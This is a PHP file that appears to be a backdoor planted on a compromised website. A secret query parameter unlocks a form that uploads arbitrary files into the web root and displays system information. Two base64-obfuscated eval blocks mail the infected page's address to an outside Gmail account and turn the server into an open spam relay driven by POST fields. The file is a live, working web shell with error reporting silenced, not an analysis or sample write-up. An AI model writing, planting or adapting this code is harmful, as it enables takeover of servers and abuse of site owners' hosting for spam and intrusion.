<?php
error_reporting(0);
if(isset($_GET["Chitoge"])) {
    echo "<h1><i>Chitoge kirisaki <3</i></h1><br>";
    echo "<b><phpuname>".php_uname()."</phpuname></b><br>";
    echo "<form method='post' enctype='multipart/form-data'>
          <input type='file' name='idx_file'>
          <input type='submit' name='upload' value='upload'>
          </form>";
    $root = $_SERVER['DOCUMENT_ROOT'];
    $files = $_FILES['idx_file']['name'];
    $dest = $root.'/'.$files;
    if(isset($_POST['upload'])) {
        if(is_writable($root)) {
            if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
                $web = "http://".$_SERVER['HTTP_HOST'];
                echo "Sukses -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
            } else {
                echo "gagal upload di document root.";
            }
        } else {
            if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
                echo "sukses upload <b>$files</b> di folder ini";
            } else {
                echo "gagal upload";
            }
        }
    }
} else{
    eval(base64_decode('JGZyb20gPSAiaW5mb0AiLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddOwokdG8gPSAienNhbXUuaW5kb0BnbWFpbC5jb20iOwokc3ViamVjdCA9ICJDaGVja2luZyBQSFAgbWFpbCI7CiRtZXNzYWdlID0gJF9TRVJWRVJbJ1NDUklQVF9VUkknXTsKJGhlYWRlcnMgPSAiRnJvbToiIC4gJGZyb207Cm1haWwoJHRvLCRzdWJqZWN0LCRtZXNzYWdlLCAkaGVhZGVycyk7CmlmIChtYWlsKCR0bywkc3ViamVjdCwkbWVzc2FnZSwgJGhlYWRlcnMpKXsKICAgIGVjaG8gIk1BTlRBUE9PTyI7Cn0gZWxzZXsKICAgIGVjaG8gIk5PVCI7Cn0='));
    eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwpkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCRfUE9TVFsnY29uZmlnJ11bJ3RpbWVfem9uZSddKTsKJHJlcXVpcmVkID0gYXJyYXkoCgknbGV0dGVyJywndG8nLCdzdWJqZWN0JywnaGVhZGVyJywnY29uZmlnJywgJ25vdGUnCik7CmZvcmVhY2ggKCRyZXF1aXJlZCBhcyAka2V5ID0+ICR2YWx1ZSkgewoJaWYgKCAhZW1wdHkoJF9QT1NUWyR2YWx1ZV0pICl7CgkJJGNvdW50W10gPSAkX1BPU1RbJHZhbHVlXTsKCX0KfQppZihjb3VudCgkY291bnQpICE9IGNvdW50KCRfUE9TVCkgfHwgY291bnQoJHJlcXVpcmVkKSAhPSBjb3VudCgkY291bnQpKXsKCSRzdGF0dXMgPSAganNvbl9lbmNvZGUoYXJyYXkoCgkJJ3N0YXR1cycgID0+IGZhbHNlLAoJCSdtZXNzYWdlJyA9PiAnYWRhIGRhdGEgeWFuZyBrb3NvbmcnCgkpKTsKCWRpZSgkc3RhdHVzKTsKfQoKJF9QT1NUWydoZWFkZXInXVsnaGVhZGVyJ11bJ0RhdGUnXSAJCT0gZGF0ZSgiciAoVCkiKTsKCmZvcmVhY2ggKCRfUE9TVFsnaGVhZGVyJ11bJ2hlYWRlciddIGFzICRrZXkgPT4gJHZhbHVlKSB7CgkkaGVhZGVyc1tdID0gJGtleS4iOiAiLiR2YWx1ZTsgCn0KCi8vZGllKHByaW50X3IoJGhlYWRlcnMpKTsKCmlmKCBtYWlsKCRfUE9TVFsndG8nXSwgJF9QT1NUWydzdWJqZWN0J10sIGJhc2U2NF9kZWNvZGUoJF9QT1NUWydsZXR0ZXInXSkgLCBpbXBsb2RlKCJcclxuIiwgJGhlYWRlcnMpKSApewoJJHN0YXR1cyA9ICBqc29uX2VuY29kZShhcnJheSgKCQknc3ViamVjdCcgPT4gJF9QT1NUWydzdWJqZWN0J10sCgkJJ3N0YXR1cycgID0+IHRydWUsCgkJJ21lc3NhZ2UnID0+ICdTdWtzZXMnLAoJCSdub3RlJyAJICA9PiAkX1BPU1RbJ25vdGUnXSwKCSkpOwp9ZWxzZXsKCSRzdGF0dXMgPSAganNvbl9lbmNvZGUoYXJyYXkoCgkJJ3N0YXR1cycgID0+IGZhbHNlLAoJCSdtZXNzYWdlJyA9PiAnR2FnYWwnLAoJCSdub3RlJyAJICA9PiAkX1BPU1RbJ25vdGUnXSwKCSkpOwp9CmlmKCRzdGF0dXMpewoJZGllKCRzdGF0dXMpOwp9ZWxzZXsKCSRzdGF0dXMgPSAganNvbl9lbmNvZGUoYXJyYXkoCgkJJ3N0YXR1cycgID0+IGZhbHNlLAoJCSdtZXNzYWdlJyA9PiAnS2VzYWxhaGFuIFNlcnZlcicKCSkpOwoJZGllKCRzdGF0dXMpOwp9'));
}
?>